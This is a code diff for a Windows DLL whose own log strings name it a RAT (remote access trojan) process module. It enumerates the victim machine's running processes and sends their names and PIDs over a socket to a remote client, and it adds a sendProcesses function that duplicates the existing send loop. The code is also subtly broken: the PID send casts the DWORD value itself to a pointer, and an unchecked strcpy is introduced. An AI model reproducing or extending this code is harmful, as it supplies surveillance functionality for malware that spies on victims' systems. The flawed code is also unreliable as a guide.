@@ -16,7 +16,7 @@ INT handleProcessList(SOCKET clientSock)
 {
 	 INT status = SUCCESS, numProcesses = 0;
 	 CHAR msgBuf[DEFAULT_BUF_LEN];
-	 CHAR** processNames = NULL;
+	 char** processNames = NULL;
 	 DWORD* processPIDs = NULL;
 
 	 // Grab a list of process names and their PIDs
@@ -41,13 +41,20 @@ INT handleProcessList(SOCKET clientSock)
 		 goto cleanup;
 	 }
 
+
+
+	 status = sendProcesses(clientSock, processNames, processPIDs, numProcesses);
+
+
+
+
 	 // Iterate through each list, send the process name and the PID
 	 for (int i = 0; i < numProcesses; i++)
 	 {
-		 sprintf_s(msgBuf, "RAT-Dll-Process::handleProcessList - Sending process %s\n", *processNames);
+		 sprintf_s(msgBuf, "RAT-Dll-Process::handleProcessList - Sending process %s\n", processNames[i]);
 		 OutputDebugStringA(msgBuf);
 
-		 status = send(clientSock, processNames[i], sizeof(processNames), 0);
+		 status = send(clientSock, (processNames)[i], strlen(processNames[i]), 0);
 		 if (status == SOCKET_ERROR)
 		 {
 			 sprintf_s(msgBuf, "RAT-Dll-Process::handleProcessList - Failure recevied from send (process name %s) %d\n", processNames[i], WSAGetLastError());
@@ -60,7 +67,7 @@ INT handleProcessList(SOCKET clientSock)
 		 OutputDebugStringA(msgBuf);
 
 		 //status = send(clientSock, (const char*)processPIDs[i], sizeof(DWORD), 0);
-		 status = send(clientSock, (const char*)processPIDs[i], sizeof(DWORD), 0);
+		 status = send(clientSock, (const char*)processPIDs[i], sizeof(processPIDs[i]), 0);
 		 if (status == SOCKET_ERROR)
 		 {
 			 sprintf_s(msgBuf, "RAT-Dll-Process::handleProcessList - Failure recevied from send (process pid number %d) %d\n", processPIDs[i], WSAGetLastError());
@@ -90,14 +97,14 @@ INT handleProcessList(SOCKET clientSock)
 }
 
 
-INT doProcessList(__out CHAR*** processNames, __out DWORD** processPIDs, __out INT* numProcesses)
+INT doProcessList(__out char*** processNames, __out DWORD** processPIDs, __out INT* numProcesses)
 {
 	INT status = SUCCESS;
 	DWORD aProcesses [1024], cbNeeded = 0, cProcesses = 0;
 	CHAR msgBuf[DEFAULT_BUF_LEN];
-	CHAR szProcessName[MAX_PATH];
+	char szProcessName[MAX_PATH];
 	UINT64 i;
-	CHAR** processNamesOut = NULL;
+	char** processNamesOut = NULL;
 	DWORD* processPIDsOut = NULL;
 
 	// Return value should be non-zero
@@ -118,7 +125,7 @@ INT doProcessList(__out CHAR*** processNames, __out DWORD** processPIDs, __out I
 	OutputDebugStringA(msgBuf);
 
 	// Get each process name and ID
-	processNamesOut = (CHAR**)malloc(cProcesses * sizeof(CHAR*));
+	processNamesOut = (char**)malloc(cProcesses * sizeof(char*));
 	if (processNamesOut == NULL)
 	{
 		OutputDebugStringA("RAT-Dll-Process::doProcessList - Failed to allocate enough memory!\n");
@@ -151,7 +158,8 @@ INT doProcessList(__out CHAR*** processNames, __out DWORD** processPIDs, __out I
 					GetModuleBaseNameA(hProcess, hMod, szProcessName, sizeof(szProcessName)/sizeof(CHAR));
 
 					// Copy over this base name
-					processNamesOut[i] = (CHAR*)malloc(sizeof(char) * sizeof(szProcessName) / sizeof(CHAR));
+					//processNamesOut[i] = (CHAR*)malloc(sizeof(char) * sizeof(szProcessName) / sizeof(CHAR));
+					processNamesOut[i] = (char*)malloc(sizeof(char) * sizeof(szProcessName));
 					if (processNamesOut[i] == NULL)
 					{
 						OutputDebugStringA("RAT-Dll-Process::doProcessList - Failed to allocate enough memory!\n");
@@ -159,27 +167,11 @@ INT doProcessList(__out CHAR*** processNames, __out DWORD** processPIDs, __out I
 						goto cleanup;
 					}
 
-					if (!memcpy(processNamesOut[i], szProcessName, sizeof(szProcessName)))
-					{
-						sprintf_s(msgBuf, "RAT-Dll-Process::doProcessList - Failure received from memcpy %d\n", status);
-						OutputDebugStringA(msgBuf);
-						status = FAILURE;
-						goto cleanup;
-					}
+					strcpy(processNamesOut[i], szProcessName);
 
-					// We already have the PID so copy that as well
-					/**
-					if (!memcpy(*processPIDs, &aProcesses[i], sizeof(aProcesses[i])))
-					{
-						sprintf_s(msgBuf, "RAT-Dll-Process::doProcessList - Failure received from memcpy %d\n", status);
-						OutputDebugStringA(msgBuf);
-						status = FAILURE;
-						goto cleanup;
-					}
-					*/
-					//processPIDs[i] = &aProcesses[i];
+					processPIDsOut[i] = aProcesses[i];
 
-					sprintf_s(msgBuf, "RAT-Dll-Process::doProcessList - Process %s \n", processNamesOut[i]);
+					sprintf_s(msgBuf, "RAT-Dll-Process::doProcessList - Process %s PID %i\n", processNamesOut[i], processPIDsOut[i]);
 					OutputDebugStringA(msgBuf);
 				}
 
@@ -193,17 +185,6 @@ INT doProcessList(__out CHAR*** processNames, __out DWORD** processPIDs, __out I
 			OutputDebugStringA(msgBuf);
 		}
 	}
-	
-	// Just copy over the entire array...
-	if (!memcpy(processPIDsOut, aProcesses, sizeof(DWORD)*cProcesses))
-	{
-		sprintf_s(msgBuf, "RAT-Dll-Process::doProcessList - Failure received from memcpy %d\n", status);
-		OutputDebugStringA(msgBuf);
-		status = FAILURE;
-		goto cleanup;
-	}
-	
-
 
 	*processNames = processNamesOut;
 	*processPIDs = processPIDsOut;
@@ -211,5 +192,44 @@ INT doProcessList(__out CHAR*** processNames, __out DWORD** processPIDs, __out I
 
 
 cleanup: 
+	return status;
+}
+
+INT sendProcesses(SOCKET clientSock, char** processNames, DWORD* processPIDs, INT numProcesses)
+{
+	INT status = SUCCESS;
+	CHAR msgBuf[DEFAULT_BUF_LEN];
+
+	for (int i = 0; i < numProcesses; i++)
+	{
+		sprintf_s(msgBuf, "RAT-Dll-Process::sendProcesses - Sending process %s\n", processNames[i]);
+		OutputDebugStringA(msgBuf);
+
+		status = send(clientSock, (processNames)[i], strlen(processNames[i]), 0);
+		if (status == SOCKET_ERROR)
+		{
+			sprintf_s(msgBuf, "RAT-Dll-Process::sendProcesses - Failure recevied from send (process name %s) %d\n", processNames[i], WSAGetLastError());
+			OutputDebugStringA(msgBuf);
+			status = WSAGetLastError();
+			goto cleanup;
+		}
+
+		sprintf_s(msgBuf, "RAT-Dll-Process::sendProcesses - Sending PID %d\n", processPIDs[i]);
+		OutputDebugStringA(msgBuf);
+
+		//status = send(clientSock, (const char*)processPIDs[i], sizeof(DWORD), 0);
+		status = send(clientSock, (const char*)processPIDs[i], sizeof(processPIDs[i]), 0);
+		if (status == SOCKET_ERROR)
+		{
+			sprintf_s(msgBuf, "RAT-Dll-Process::sendProcesses - Failure recevied from send (process pid number %d) %d\n", processPIDs[i], WSAGetLastError());
+			OutputDebugStringA(msgBuf);
+			status = WSAGetLastError();
+			goto cleanup;
+		}
+	}
+
+
+
+cleanup:
 	return status;
 }
